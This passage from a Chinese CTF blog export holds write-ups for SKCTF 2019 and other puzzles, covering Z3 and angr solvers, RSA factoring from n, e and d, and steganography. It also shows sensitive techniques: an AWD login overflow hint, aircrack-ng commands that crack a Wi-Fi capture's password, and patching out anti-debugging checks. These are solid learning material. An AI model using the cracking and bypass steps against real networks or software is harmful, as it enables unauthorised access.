4]+1733*a[5]+1741*a[6]+1747*a[7]+1753*a[8]+1759*a[9]+1777*a[10]+1783*a[11]+1787*a[12]+1789*a[13]+1801*a[14]+1811*a[15]+1823*a[16]+1831*a[17]+1847*a[18]+1861*a[19]+1867*a[20]+1871*a[21]==4143323)s.add(1873*a[0]+1877*a[1]+1879*a[2]+1889*a[3]+1901*a[4]+1907*a[5]+1913*a[6]+1931*a[7]+1933*a[8]+1949*a[9]+1951*a[10]+1973*a[11]+1979*a[12]+1987*a[13]+1993*a[14]+1997*a[15]+1999*a[16]+2003*a[17]+2011*a[18]+2017*a[19]+2027*a[20]+2029*a[21]==4553197)s.add(2039*a[0]+2053*a[1]+2063*a[2]+2069*a[3]+2081*a[4]+2083*a[5]+2087*a[6]+2089*a[7]+2099*a[8]+2111*a[9]+2113*a[10]+2129*a[11]+2131*a[12]+2137*a[13]+2141*a[14]+2143*a[15]+2153*a[16]+2161*a[17]+2179*a[18]+2203*a[19]+2207*a[20]+2213*a[21]==4942889)s.add(2221*a[0]+2237*a[1]+2239*a[2]+2243*a[3]+2251*a[4]+2267*a[5]+2269*a[6]+2273*a[7]+2281*a[8]+2287*a[9]+2293*a[10]+2297*a[11]+2309*a[12]+2311*a[13]+2333*a[14]+2339*a[15]+2341*a[16]+2347*a[17]+2351*a[18]+2357*a[19]+2371*a[20]+2377*a[21]==5356539)s.add(2381*a[0]+2383*a[1]+2389*a[2]+2393*a[3]+2399*a[4]+2411*a[5]+2417*a[6]+2423*a[7]+2437*a[8]+2441*a[9]+2447*a[10]+2459*a[11]+2467*a[12]+2473*a[13]+2477*a[14]+2503*a[15]+2521*a[16]+2531*a[17]+2539*a[18]+2543*a[19]+2549*a[20]+2551*a[21]==5731505)s.add(2557*a[0]+2579*a[1]+2591*a[2]+2593*a[3]+2609*a[4]+2617*a[5]+2621*a[6]+2633*a[7]+2647*a[8]+2657*a[9]+2659*a[10]+2663*a[11]+2671*a[12]+2677*a[13]+2683*a[14]+2687*a[15]+2689*a[16]+2693*a[17]+2699*a[18]+2707*a[19]+2711*a[20]+2713*a[21]==6177663)s.add(2719*a[0]+2729*a[1]+2731*a[2]+2741*a[3]+2749*a[4]+2753*a[5]+2767*a[6]+2777*a[7]+2789*a[8]+2791*a[9]+2797*a[10]+2801*a[11]+2803*a[12]+2819*a[13]+2833*a[14]+2837*a[15]+2843*a[16]+2851*a[17]+2857*a[18]+2861*a[19]+2879*a[20]+2887*a[21]==6522731)s.add(2897*a[0]+2903*a[1]+2909*a[2]+2917*a[3]+2927*a[4]+2939*a[5]+2953*a[6]+2957*a[7]+2963*a[8]+2969*a[9]+2971*a[10]+2999*a[11]+3001*a[12]+3011*a[13]+3019*a[14]+3023*a[15]+3037*a[16]+3041*a[17]+3049*a[18]+3061*a[19]+3067*a[20]+3079*a[21]==6954217)s.add(3083*a[0]+3089*a[1]+3109*a[2]+3119*a[3]+3121*a[4]+3137*a[5]+3163*a[6]+3167*a[7]+3169*a[8]+3181*a[9]+3187*a[10]+3191*a[11]+3203*a[12]+3209*a[13]+3217*a[14]+3221*a[15]+3229*a[16]+3251*a[17]+3253*a[18]+3257*a[19]+3259*a[20]+3271*a[21]==7419507)s.add(3299*a[0]+3301*a[1]+3307*a[2]+3313*a[3]+3319*a[4]+3323*a[5]+3329*a[6]+3331*a[7]+3343*a[8]+3347*a[9]+3359*a[10]+3361*a[11]+3371*a[12]+3373*a[13]+3389*a[14]+3391*a[15]+3407*a[16]+3413*a[17]+3433*a[18]+3449*a[19]+3457*a[20]+3461*a[21]==7843195)print s.check()if s.check() == sat: print s.model() m = s.model() L = [] for i in range(22): L.append(m[a[i]]) print Lt2 = time.time()print(t2-t1),'s'一些关于Z3的博文传送门传送门传送门","categories":[{"name":"随手小记","slug":"随手小记","permalink":"http://liul14n.top/categories/随手小记/"}],"tags":[]},{"title":"SKCTF_2019","slug":"SKCTF-2019","date":"2019-05-29T15:01:45.000Z","updated":"2022-03-20T17:32:36.700Z","comments":true,"path":"2019/05/29/SKCTF-2019/","link":"","permalink":"http://liul14n.top/2019/05/29/SKCTF-2019/","excerpt":"","text":"**前段时间参加了SKCTF2019,并且最近推完了《三色绘恋》, 作为纪念, 这篇博文的所有配图都用《三色绘恋》里面的CG了~ 可爱的墨小菊作封面镇博~ **这篇博文会持续更新,直到我把我会做的所有题都更一篇WP为止AWD部分我没什么AWD经验, 登入服务器什么的还是现学的, 下载下来pwn以后也只是粗略分析… 忽视了一个大漏洞,导致pwn一直被打而没有进攻…我与进攻只差一个666。首先pwn的login是一个点, 这个通过被攻击流量直接拿到了打法。用户名直接a上200个, 密码a上72个。但是这个流量里面含有太多攻击者的测试阶段, 这对第一次进行AWD流量分析的我产生了干扰。。。 再加上我不太会pwn,我以为要执行完所有攻击者的行为才能cat flag。但是运行过程中一直在调试… 忽略了最简单的666,起初还纳闷这个666是干什么的,直到赛后表哥讲解的时候才恍然大悟… 这心情感觉就像高考试卷没写名字一样…。先暂时记录到这, 因为还没开始正式学pwn, 先从逆向学起~MISC部分0x01 unzip考察时间戳, 可以直接爆破压缩包密码。时间戳是指格林威治时间1970年01月01日00时00分00秒(北京时间1970年01月01日08时00分00秒)起至现在的总秒数。可以直接从1550000000 开始爆破密码, 这样省时间。解开zip 得到flag。0x02 二维码考察PIL库的运用, 编码与加解密。题目是给了一堆RGB值, 把它保存在一个文件里。 脚本附上。123456789101112131415from PIL import Imagex = 280y = 280im = Image.new(\"RGB\", (x, y))file = open(\"D:\\\\RGB.txt\",'r')for i in range(0, x): for j in range(0, y): line = file.readline().replace('(','').replace(')','') rgb = line.split(\",\") im.putpixel((i, j), (int(rgb[0]), int(rgb[1]), int(rgb[2])))im.show()得到二维码扫码得到:ONYXE6LSIVXF6ZTUOZTXWRRRIRPWCZLWORIGCLJQG56Q====base32解码得到:sqryrEn_ftvg{F1D_aevtPa-07}9栏栅栏解密得到:synt{DeP0qr_vF_va7rEfg1at-}凯撒解密得到:flag{QrC0de_iS_in7eRst1ng-}0x03 猜数考察写脚本能力或者说…耐心…这道题我是试了手撕了一百多次,得到了150个数据,然后得到了flag.这150个数据就不列出来了.这里学习大佬的利用pwntools的解法。1234567891011121314from pwn import *import timet = ['679']#这个表示初始数据, 根据题目来的,因为第一个数需要输入679才对。for x in range(0xff):#这里是设置需要循环的次数, 可根据需要调整, 这道题目150就够了。 p = remote('10.1.0.18',10000) for c in t: p.sendline(str(c)) p.sendline('a')#发送一个注定不合法的字符, 然后接收程序返回的正确数据。 time.sleep(0.1)#间隔0.1秒来防止由于网络问题出现的错误 t.append(p.recv().split('Good!\\n')[-1].replace('\\n',''))#接收并添加数据进入列表t p.close() #print t #这一步可以不要。这样的话, 如果数据和题目提供的数据完全相同的话, flag也就会跟着输出出来了。0x04 Manchester考察图片隐写与曼彻斯特编码。在kali里面binwalk题目图片,发现里面还隐藏着一张图片, foremost分离出来以后是一堆类似于-. 这种。还没做完,等平台重新开放再更。Crypto部分0x01 签到题考察手速和仔细程度公告真该仔细看看。0x02 RSA考察对RSA算法的理解与应用。之前见过的题目大都是已知pqe或ne推出d之类的,而这个题目是已知ned去反推pq。尝试对模n进行在线分解,但是无果, n实在太大了。又尝试进行正向爆破,看看谁(p)乘谁(q)等于模n,但是…n实在太大了, 数据都超出范围了…无奈只能上网找算法。脚本附上:1234567891011121314151617181920212223242526272829303132333435363738# -*- coding: UTF-8 -*-import randomdef gcd(a, b): if a &lt; b: a, b = b, a while b != 0: temp = a % b a = b b = temp return adef getpq(n,e,d): p = 1 q = 1 while p==1 and q==1: k = d * e - 1 g = random.randint ( 0 , n ) while p==1 and q==1 and k % 2 == 0: k /= 2 y = pow(g,k,n) if y!=1 and gcd(y-1,n)&gt;1: p = gcd(y-1,n) q = n/p return p,qdef main(): n =16352578963372306131642407541567045533766691177138375676491913897592458965544068296813122740126583082006556217616296009516413202833698268845634497478988128850373221853516973259086845725813424850548682503827191121548693288763243619033224322698075987667531863213468223654181658012754897588147027437229269098246969811226129883327598021859724836993626315476699384610680857047403431430525708390695622848315322636785398223207468754197643541958599210127261345770914514670199047435085714403641469016212958361993969304545214061560160267760786482163373784437641808292654489343487613446165542988382687729593384887516272690654309 e =65537 d =9459928379973667430138068528059438139092368625339079253289560577985304435062213121398231875832264894458314629575455553485752685643743266654630829957442008775259776311585654014858165341757547284112061885158006881475740553532826576260839430343960738520822367975528644329172668877696208741007648370045520535298040161675407779239300466681615493892692265542290255408673533853011662134953869432632554008235340864803377610352438146264524770710345273439724107080190182918285547426166561803716644089414078389475072103315432638197578186106576626728869020366214077455194554930725576023274922741115941214789600089166754476449453 p,q = getpq(n,e,d) print p print qif __name__ == '__main__': main()由此可以得到pq,然后代入题目给的脚本。12345678910111213from gmpy2 import invertfrom md5 import md5p = 121681461613856685891389697655082707982324934394003375745821514797619569583750841725694490585739982440237839675155146102668334623474524757328414864963814738071946391260695792366762521733527504377788503669628114869921159658618293030663730923781347146576731525405173348568491361155907470541865888995846800200299q =134388416661738455437155072073325006890713121761597606147089758733385481112565493304597414841403553334452751594251761452974840757858360219741735123120957682353146947112071576479841838875008748813717254467137424822946053401492632307085887983816096569782409349352398269269865393361999329194582827715646840442991e = 65537n = p*qphi = (p-1)*(q-1)d = invert(e, phi)print n, e, dprint \"Flag: SKCTF&#123;%s&#125;\" %md5(str(p + q)).hexdigest()运行得到flag:SKCTF{e7ddad281ff7dfc99eb3379e0efd46f8}0x03 xor题目是这么一堆字符…1rJeekZuQkZjfqpGWiZqNjJaLht+Qmd+snJaakZya356Rm9+rmpyXkZCTkJiG9b6bm42ajIzFysjG366WnpGInpGYnpGY362QnpvT37eKnpGYm56Q37uWjIuNlpyL09+ulpGYm56Q09+sl56Rm5CRmN+vjZCJlpGcmtPfzcnJysbP09+v0a3RvJeWkZ71rLS8q7mEzpvJnsnLm8rGzc/Nyp7LzcbNmp2Zy5mZxpyZxsvOzsuC比赛的时候对着这么一串字符与0~256都异或了一遍, 然并卵。殊不知需要先对这一串字符进行base64解密。。。。脚本附上:123456789# -*- coding: UTF-8 -*-import base64s = 'rJeekZuQkZjfqpGWiZqNjJaLht+Qmd+snJaakZya356Rm9+rmpyXkZCTkJiG9b6bm42ajIzFysjG366WnpGInpGYnpGY362QnpvT37eKnpGYm56Q37uWjIuNlpyL09+ulpGYm56Q09+sl56Rm5CRmN+vjZCJlpGcmtPfzcnJysbP09+v0a3RvJeWkZ71rLS8q7mEzpvJnsnLm8rGzc/Nyp7LzcbNmp2Zy5mZxpyZxsvOzsuC'str = base64.b64decode(s)for i in range(0xff+1): ss = '' for x in str: ss+=chr(ord(x)^i) print ss运行结果挺有意思的…flag:SKCTF{1d6a64d592025a4292ebf4ff9cf94114}0x04 抓捕贪污犯考察仿射密码题目没记下来…等平台再开的时候再更…基本思路就是先通过题目的提示 写个小算法得到a与b, 然后对题目中那一串字符串进行仿射解密。Reverse 部分0x01 CUBE考察angr的运用。之前曾经接触过一些angr方面的题目, 但是与之前题目不同的是,这道题的avoid的地方有多个,谷歌到需要使用元组来进行avoid。但是比赛的时候并没有完整地解出来这道题目。因为考虑的方向有所偏差,陷入一片迷茫。比赛时我的find地址选的0x401015,这样导致无法执行到下面0x4010C1的printf后门。 哭,再一次辜负了表哥的期望… awd里的pwn也是因为后门。。。逆向也是因为后门。。。如果是执行我所选用的find地址,执行结果为:0000263700000026370000002637000000263700000026370000002637000000263700000026370000000000000000000000000000000000000000000000263700000026370000002637000000263700但是鉴于C语言里面 00002637与2637等值, 尽管程序可以通过执行并且输入十来个数进行check,如果对就返回flag。 但angr的执行结果返回了这么一堆带0的东西,而且没有分隔,这导致我不知道这十来个数到底是00002637还是2637或是26370之类的具体哪种或者哪几种。赛后复现题目的时候表哥给了个思路, find的地址直接取到后门的printf位置,这样便能直接输出flag!提供两个脚本,分别是windows版本的和Linux版本的。1234567891011121314#Windowsimport angravoid = [0x40095B,0x400A98,0x400B16,0x400E6E,0x400EC2,0x400F70,0x401001]proj = angr.Project('D:\\\\CUBE',auto_load_libs = False)state = proj.factory.entry_state()simgr = proj.factory.simulation_manager(state)simgr.explore(find = 0x4010C1,avoid = avoid)#simgr.found[0].posix.dumps(0)print simgr.found[0].posix.dumps(1)123456789101112#Linuximport angravoid = [0x40095B,0x400A98,0x400B16,0x400E6E,0x400EC2,0x400F70,0x401001]proj = angr.Project('./CUBE',auto_load_libs = False)state = proj.factory.entry_state()simgr = proj.factory.simulation_manager(state)simgr.explore(find = 0x4010C1,avoid = avoid)simgr.found[0].posix.dumps(1)运行得到flag:skctf{2637002637000263700-26370026370002637002637002637000263700-2637002637000263700}0x02 FibonacciIDA载入 来到main函数位置查看伪代码。提供两个方法。方法一 算法逆向既然是Fibonacci,也就是斐波那契数列, 那么查看check函数。函数中 dword_60ACC0与 dword_60ACC4是我们输入的两个数。dword_601080则是存放着斐波那契数列的一个数组。根据这个函数, 它遍历了从斐波那契数列第一个数到第五十个数,如果满足我们输入的两个数是斐波那契数列中相邻的两个数并且它们之和为75025,则成功输出flag。那么我们只需要先写出来一个长度为50的斐波那契数列,脚本如下:123456# -*- coding: UTF-8 -*-L = [1,1]for i in range(48): x = L[i]+L[i+1] L.append(x)print L结合斐波那契数列的性质, 我们输入的两个数相加一定会是斐波那契数列中的另一个数,并且在我们输入的这俩数中较大的一个数的后面。在输出的L里查找得到28657,46368,75025这一串,所以28657,46368即为答案。所以flag为:SKCTF{2865746368}方法二 angr由第一个CUBE题产生了灵感,直接angr。直接上脚本了, Windows的脚本。1234567891011import angrproj = angr.Project('D:\\\\Fibonacci',auto_load_libs = False)state = proj.factory.entry_state()simgr = proj.factory.simulation_manager(state)simgr.explore(find = 0x4008C4)print simgr.found[0].posix.dumps(1)直接输出:The flag is SKCTF{2865746368}Pwn 部分但愿我能在这一部分更上一篇… 能力有限,还是先以逆向为主…","categories":[{"name":"CTF","slug":"CTF","permalink":"http://liul14n.top/categories/CTF/"}],"tags":[]},{"title":"实验吧-A记录","slug":"实验吧-A记录","date":"2019-05-23T14:10:29.000Z","updated":"2019-08-08T07:59:26.927Z","comments":true,"path":"2019/05/23/实验吧-A记录/","link":"","permalink":"http://liul14n.top/2019/05/23/实验吧-A记录/","excerpt":"","text":"下载下来是个cap文件, 用wireshark打开,但是提示文件好像被截断。出现这个报错可能因为该文件被加密了。下面来破解该文件。1aircrack-ng shipin.cap -w zidian.txt得到密码 888888881aircrack-ng shipin.cap得到ESSID为07191airdecap-ng shipin.cap -e 0719 -p 88888888得到了shipin-dec.cap,用wireshark打开就没有那个报错了。根据题目:A记录过滤DNS根据题目,“看视频” 的话, 应该youku或者cntv吧, 这几个都试试看,最后试出来是1push.m.youku.com所以最后flag为ctf{push.m.youku.com}","categories":[{"name":"杂项","slug":"杂项","permalink":"http://liul14n.top/categories/杂项/"}],"tags":[]},{"title":"JCTF-逆向","slug":"JCTF-逆向","date":"2019-05-21T13:22:00.000Z","updated":"2019-08-08T07:59:04.525Z","comments":true,"path":"2019/05/21/JCTF-逆向/","link":"","permalink":"http://liul14n.top/2019/05/21/JCTF-逆向/","excerpt":"","text":"re100下载下来并没有拓展名, 查看16进制发现是个apk文件。拖入JEB或者APK改之理。还有一部分没截到,根据题意, 一个字符串要先经过 MD5 加密, 然后将得到的MD5值进行base64加密, 如果与下面这一串相等则正确。NzU2ZDJmYzg0ZDA3YTM1NmM4ZjY4ZjcxZmU3NmUxODk=上面的字符串进行base64解密得到756d2fc84d07a356c8f68f71fe76e189曾经想过正向爆破…但是正向爆破需要的时间…太多太多,而且不知道flag有多少位。在线解密得到:}321nimda{galflj反过来就是flag了jlflag{admin123}re200查看16进制 文件头为 4D 5A,为exe文件的文件头但是…而且载入IDA也没啥效果, 而且没法载入OD。WP说是文件头有损坏, 那么下面的任务就是修复PE文件头了。位于 30h,c位置 的E9 为e_lfanew字段, 这个字段指明了PE文件头在文件中的位置PE文件头为50 45 00 00显然 E9 指向的位置不对, 应该指向50才对,所以需要将E8改为E9再将ff改为00保存, 强迫症… 加个拓展名.exe这下正常显示了。拖入IDA, 一堆C++伪代码, 看着有点恶心。迷迷糊糊按着WP写了个破解算法。起初写的python算法, 然后发现,执行效率低得感人…具体效率能有多低, 看这一张图就知道了….补充: 重新测试了一遍…原来是我算法有个地方写错了…C和python的都写错了…但python效率还是低, C的都按照错误算法输出了好多…但python一个都没输出….加法优先级大于异或。。。输出有多组,挨个代进去, 最后15 6 13这一组是正确的。再结合IDA静态分析的结果,最后flag为:jlflag{15613abc}","categories":[{"name":"逆向","slug":"逆向","permalink":"http://liul14n.top/categories/逆向/"}],"tags":[]},{"title":"WhaleCTF-rev2","slug":"WhaleCTF-rev2","date":"2019-05-17T14:00:09.000Z","updated":"2019-08-08T07:59:04.527Z","comments":true,"path":"2019/05/17/WhaleCTF-rev2/","link":"","permalink":"http://liul14n.top/2019/05/17/WhaleCTF-rev2/","excerpt":"","text":"下载下来 拉入32位IDA查看主函数的伪代码。看到了似曾相识的IsDebuggerPresent函数。BOOL WINAPI IsDebuggerPresent( void );这个函数的用途就是用来检查程序是否在ring 3调试器中运行,该函数位于Kernel32.dll中。如果当前进程在调试器上下文中运行，则返回值为非零。如果当前进程不在调试器上下文中运行，则返回值为零。根据主函数, 先是一个if语句, 如果sub_40102A()函数或者IsDebuggerPresent()函数返回 Ture,则退出程序。进入sub_40102A()函数,发现这个函数无论如何都会返回0,也就是假。搜了一番如何绕过IsDebuggerPresent()函数检测。用OD载入定位到IsDebuggerPresent()函数。查看其调用树,在每次调用上都设断点。运行,然后发现程序断在这个位置。第一次先不做任何操作, 来单步看看有什么跳转么。依次单步, 发现这个je跳转, 跳转已实现, 会跳过第一个messageBosA来到第二个MessageBoxA。但是第二个MessageBoxA会弹出一堆乱码, 并且下方就有Heapfree来释放堆了, 再往后就没有MessageBoxA函数了,并且再走几步就会Exit退出。而根据IDA的静态分析, flag应该是通过MessageBoxA函数弹出的。 所以判断这个je跳转应该不让它实现跳转才对。所以直接最简单的方法, nop掉那个je跳转,或者je改为jne, 然后再次单步, 发现程序到了这个int3中断的地方就会退出程序。但至于为什么这个int3中断会导致程序退出, 还没找到合适的解释。但既然它会导致退出,无奈只能nop掉它, 然后接着单步。又是一个跳转, 发现这个跳转会直接跳转到Exit的位置, 所以不能让它跳转,直接nop掉。这时候call了一个MessageBoxA函数,弹出了一个窗口,但是里面没有内容,这仨按钮随便选一个就行, 然后又是一个跳转。既然第一个MessageBoxA没有弹出真正的flag个,那只能寄希望于第二个了, 而这个跳转会跳到堆释放的位置,然后结束,所以不能让它实现跳转,依然是nop掉它。接着单步,得到flag。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://liul14n.top/categories/逆向/"}],"tags":[]},{"title":"Bugku-QAQ","slug":"Bugku-QAQ","date":"2019-05-16T13:57:06.000Z","updated":"2019-08-19T04:35:10.050Z","comments":true,"path":"2019/05/16/Bugku-QAQ/","link":"","permalink":"http://liul14n.top/2019/05/16/Bugku-QAQ/","excerpt":"","text":"下载cipher.txt里面的内容为:12FSAnRAIzNlMjPQMjNyBJNTs6NlIFPFIqDDVTJy0zGE8rKxZBJDIrJkYoPUQML1M3MDYJZTElFyI7UzE6DTtSNxckNDw2Mxk9Jzc=是一段base64,但是解码以后是乱码。QAQ文件用十六进制查看器打开后发现了.py, main 之类的关键词，一看就是个pyc文件,拓展名改为pyc文件后进行反编译。用在线工具进行反编译的话, 提示有部分代码没有反编译成功, 并且在没有反编译成功的地方加了注释告诉我们这个位置有没有反编译成功的代码。转变方向,追求更高效的反编译方法。在网上得知了一款名为uncompyle6的工具。由此反编译得到了完整的py代码。针对这个文件写了一个解密脚本 decode.py12345678910111213141516171819202122232425262728293031def decrypt(key, plain): cipher = '' for i in range(len(plain)): cipher += chr(ord(key[(i % len(key))]) ^ ord(plain[i])) return cipherdef getPlainText(): plain = '' with open('cipher.txt') as (f): while True: line = f.readline() if line: plain += line else: break return plain.decode('base_64')def main(): key = 'LordCasser' plain = getPlainText() cipher = decrypt(key, plain) with open('plain.txt', 'w') as (f): f.write(cipher)if __name__ == '__main__': main()如果用编译器运行该脚本的话,需要把 open(‘cipher.txt’) 这种变成 open(‘绝对路径’)这种形式。如果不是编译器,需要保证.py脚本与脚本中用到的文件在同一路径。如图。运行脚本得到 plain.txt,内容为:1234YOU ARE FOOLEDTHIS IS NOT THAT YOU WANTGO ON DUDECATCH THAT STEGOSAURUS根据提示, 百度搜了搜那个STEGOSAURUS…结果…剑龙…???应该不会是让我们去抓住那个剑龙…谷歌一番,找到了这个看不太懂, 翻译一波链接在这。传送门所以这个应该是一种工具。搞下来以后根据用法来用。欺负我Windows上只安了python2.7.15…..无奈打开kali,因为我kali安python3了…得到flag1flag&#123;fin4lly_z3r0_d34d&#125;","categories":[{"name":"杂项","slug":"杂项","permalink":"http://liul14n.top/categories/杂项/"}],"tags":[]},{"title":"WhaleCTF-crackme(ais3)","slug":"WhaleCTF-crackme-ais3","date":"2019-05-16T08:03:06.000Z","updated":"2019-08-08T07:59:04.527Z","comments":true,"path":"2019/05/16/WhaleCTF-crackme-ais3/","link":"","permalink":"http://liul14n.top/2019/05/16/WhaleCTF-crackme-ais3/","excerpt":"","text":"下载下来文件以后发现是一个64位ELF文件。64位IDA载入后查看主函数,F5查看伪代码。需要在执行的时候传入参数。1if ( (unsigned int)verify(argv[1], argv, envp) )这是一个关键判断,跳进去看看。双击encrypted 进入对应数据段。根据题意,如果所传参数在执行对应操作以后与encrypted数据段的数据对应相等,则提示成功。如果有一处不等,则提示错误。写得算法如下。但是经过调试,发现有几个位置无法进行输出,如2 、4 、 6 、7等。苦思冥想无果以后请教大佬。一句这TM用了溢出, 点醒了梦中人。因为算法中执行了位操作,所以极有可能导致溢出,所以算法有缺陷。在后面加上&amp;0xff以后, 运行结果便正常了。0xff表示取后两位。 例如: 0x1d1&amp;0xff 就是0xd1。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://liul14n.top/categories/逆向/"}],"tags":[]},{"title":"Bugku-一个普通的压缩包","slug":"Bugku-一个普通的压缩包","date":"2019-05-13T04:46:05.000Z","updated":"2019-08-19T04:36:33.819Z","comments":true,"path":"2019/05/13/Bugku-一个普通的压缩包/","link":"","permalink":"http://liul14n.top/2019/05/13/Bugku-一个普通的压缩包/","excerpt":"","text":"题目下载下来是一个 zip.rar,打开后发现里面有个flag.txt,打开以后…是 flag is not here所以目标点应该不在这。懒得看文件头啥的了,直接拖入kali,binwalk一下发现有一个rar文件和一个zip文件。直接foremost分离它们。1foremost zip.rar分离得到的rar就是原来的那个zip.rar脱去那个zip压缩包后的rar。而zip压缩包里面有一个名为“一个普通的压缩包”的文件夹文件夹里面是一个flag.rar,打开rar文件以后里面还是flag.txt,内容依旧是flag is not here但是值得注意的是: rar文件大小有6kb,但是那个flag.txt只有1kb用十六进制查看器对这个rar压缩包查看了一番, 发现里面有一个secret.png但是为什么双击打开rar的时候却没显示这个png文件？搜索一番后得知, 这是因为我用的2345解压, 这款软件会自动过滤掉不完整的文件,这个不完整是指缺少rar文件的一些标识。具体知识可以在下面网站中学习。传送门回归原始,用winrar打开这个rar压缩包,提示如下所以目标就变成修复这个png文件的文件头。用winrar和2345解压自带的修复功能都没有用… 只能手动了。在flag.txt结束的地方就是下一个块开始的地方,flag.txt结束于 flag is not here的最后一个字母e。 则新块开始于图中A8 3C这个位置。结合文档可知A8 3C就是对应的HEAD_CRC但是HEAD_TYPE却不是0x74而是0x7A,将其改为0x74保存。再次打开rar以后发现了secret.png, 文件总大小也差不多是rar文件的大小了。观察可以发现在十六进制查看其器中 HEAD_TYPE 总是位于该文件CRC32的第三位的上方。这一点可以用来验证,修改的位置是不是HEAD_TYPE。下面对secret.png进行分析是个gif文件,拓展名改为gif后开始分离分离得到两张图片, 分别拖入Stegsolve得到一张下半部分的二维码和一张不完整的上半部分的二维码。补全对应位置得到完整二维码。扫码得到:1flag&#123;yanji4n_bu_we1shi&#125;","categories":[{"name":"杂项","slug":"杂项","permalink":"http://liul14n.top/categories/杂项/"}],"tags":[]},{"title":"Bugku-Loopandloop","slug":"Bugku-Loopandloop","date":"2019-05-13T02:16:26.000Z","updated":"2019-08-08T07:57:13.172Z","comments":true,"path":"2019/05/13/Bugku-Loopandloop/","link":"","permalink":"http://liul14n.top/2019/05/13/Bugku-Loopandloop/","excerpt":"","text":"用JEB或者APK改之理载入后查看java源码。MainActivity函数如上。程序调用了一个 native 的 chec函数调出apk文件里面的liblhm.so用IDA打开 .so文件在函数栏里面搜索 chec,双击进入 然后F5进行反编译a1,a2 为JNI接口指针和对对象和Java类的引用，是默认的，后两个参数即为Java层参数。以及GetMethodID与CallIntMethod为JNI层调用Java层方法的函数。分析算法得到：当 java层传入的第二个参数 - 1&lt;=0 返回java层的第一个参数else 根据java层第二个参数*2 %3的结果 来判断选择哪个GetMethodID方法。分析 check1 方法 ：每次将第一个参数 加上4950对于check2 方法 ： APK改之理得到的java码与JEB得到的java码不同。并且 APK改之理得到的码略有错误 。以JEB得到的java源码为例如果第二个参数%2 == 0则 第一个参数 +499500 否则 第一个参数 - 499500对于check3方法 第一个参数+49995000对于 验证算法。if (MainActivity.this.check(i, 99) == 1835996258) { localTextView.setText(&quot;The flag is:&quot;); paramBundle.setText(&quot;alictf{&quot; + MainActivity.this.stringFromJNI2(i) + &quot;}&quot;); return; }第一个参数 i 为 我们输入的 数字 第二个参数 固定为 99每个 check系列的函数 最后都会再次返回 chec函数, 再次判断执行哪个check函数,直到第二个参数-1&lt;=0才结束并最终返回第一个参数。鉴于 check 1 、2 、 3三个函数 都对第二个参数没有影响 故可得解密算法如下：得到运行结果 236492408此值即为输入以后能够得到flag 的 数。方法一： 在模拟器上安装该程序 然后输入 236492408方法二： 分析 JNI2方法 。以方法二为例：IDA载入.so文件 然后 在函数栏搜索JNI2双击进入 F5反编译。能力不够 告辞。","categories":[{"name":"安卓逆向","slug":"安卓逆向","permalink":"http://liul14n.top/categories/安卓逆向/"}],"tags":[]},{"title":"实验吧-Ascii艺术","slug":"实验吧-Ascii艺术","date":"2019-05-12T14:34:10.000Z","updated":"2019-08-08T07:59:26.927Z","comments":true,"path":"2019/05/12/实验吧-Ascii艺术/","link":"","permalink":"http://liul14n.top/2019/05/12/实验吧-Ascii艺术/","excerpt":"","text":"今天又来逛了逛实验吧。找了道编程题玩玩。像这样, 第一时间考虑到用requests库配合正则表达式进行自动提交。然鹅…要哭了…这样的话,只能挨个对应了。有个大坑点… 这个是 9 而不是 4脚本附上(Python2): 新手脚本, 勿喷…12345678910111213141516# -*- coding: UTF-8 -*-import requestsimport reurl = 'http://ctf5.shiyanbar.com/ppc/acsii.php's = requests.session()text = s.get(url).contentz = r'red\"&gt;(.*)&lt;/div&gt;'str = re.search(z,text).group()res = str.replace('red\"&gt;','').replace('xxxxx&lt;br /&gt;x&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;&amp;nbsp;xxxx&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x&lt;br /&gt;xxxxx','5').replace('&amp;nbsp;xx&lt;br&gt;&amp;nbsp;&amp;nbsp;x&amp;nbsp;x&amp;nbsp;&amp;nbsp;&lt;br&gt;&amp;nbsp;&amp;nbsp;x&amp;nbsp;&amp;nbsp;&lt;br&gt;&amp;nbsp;&amp;nbsp;x&amp;nbsp;&amp;nbsp;&lt;br&gt;xxxxx','1').replace('&amp;nbsp;x&amp;nbsp;&amp;nbsp;&amp;nbsp;x&lt;br /&gt;x&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x&lt;br /&gt;&amp;nbsp;xxxxx&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x','9').replace('&amp;nbsp;xxx&amp;nbsp;&lt;br /&gt;x&amp;nbsp;&amp;nbsp;&amp;nbsp;x&lt;br /&gt;&amp;nbsp;&amp;nbsp;xx&amp;nbsp;&lt;br /&gt;x&amp;nbsp;&amp;nbsp;&amp;nbsp;x&lt;br /&gt;&amp;nbsp;xxx&amp;nbsp;','8').replace('&amp;nbsp;xxx&amp;nbsp;&lt;br /&gt;x&amp;nbsp;&amp;nbsp;&amp;nbsp;x&lt;br /&gt;x&amp;nbsp;&amp;nbsp;&amp;nbsp;x&lt;br /&gt;x&amp;nbsp;&amp;nbsp;&amp;nbsp;x&lt;br /&gt;&amp;nbsp;xxx&amp;nbsp;','0').replace('&amp;nbsp;xxx&amp;nbsp;&lt;br /&gt;x&amp;nbsp;&amp;nbsp;&amp;nbsp;x&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;xx&amp;nbsp;&lt;br /&gt;&amp;nbsp;x&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;xxxxx','2').replace('&lt;br /&gt;','').replace('&lt;br/&gt;','').replace('&lt;/div&gt;','').replace('&lt;br&gt;','')print resdata = &#123;'inputNumber':res&#125;print s.post(url,data = data).content","categories":[{"name":"杂项","slug":"杂项","permalink":"http://liul14n.top/categories/杂项/"}],"tags":[]},{"title":"实验吧-逆向观察","slug":"实验吧-逆向观察","date":"2019-05-10T15:08:00.000Z","updated":"2019-08-08T07:59:26.928Z","comments":true,"path":"2019/05/10/实验吧-逆向观察/","link":"","permalink":"http://liul14n.top/2019/05/10/实验吧-逆向观察/","excerpt":"","text":"今天逛了逛实验吧, 找了个难度为易的题练练手…题目为rev50， 是一个elf文件,直接IDA载入后找到主函数。对src按r转换成字符串。根据题目逻辑,如果执行文件时没有参数输入,则提示:1usage ./rev50 password如果有参数传入, 